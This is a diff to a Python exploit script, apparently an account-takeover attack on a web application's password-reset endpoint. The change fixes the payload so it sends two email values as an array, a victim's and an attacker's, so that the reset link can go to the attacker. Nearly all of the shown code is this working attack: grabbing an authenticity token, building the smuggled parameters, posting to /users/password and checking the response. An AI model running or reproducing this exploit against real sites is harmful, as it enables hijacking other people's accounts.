@@ -37,11 +37,7 @@ def grab_token(url,session):
         return False
 
 def reset_password(url, session,token, victim, attacker):
-    paramsPost = {
-        "user%5Bemail%5D": victim,
-        "user%5Bemail%5D": attacker,
-        "authenticity_token": token
-    }
+    data="""user%5Bemail%5D%5B%5D={}&user%5Bemail%5D%5B%5D={}&authenticity_token={}""".format(victim,attacker,token)
     headers = {
         "Origin": "" + url + "",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -52,7 +48,7 @@ def reset_password(url, session,token, victim, attacker):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     target = urljoin(url, "/users/password")
-    response = session.post(target, data=paramsPost, headers=headers, verify=False)
+    response = session.post(target, data=data, headers=headers, verify=False)
     if "If your email address exists " in response.text:
         return True
     else:
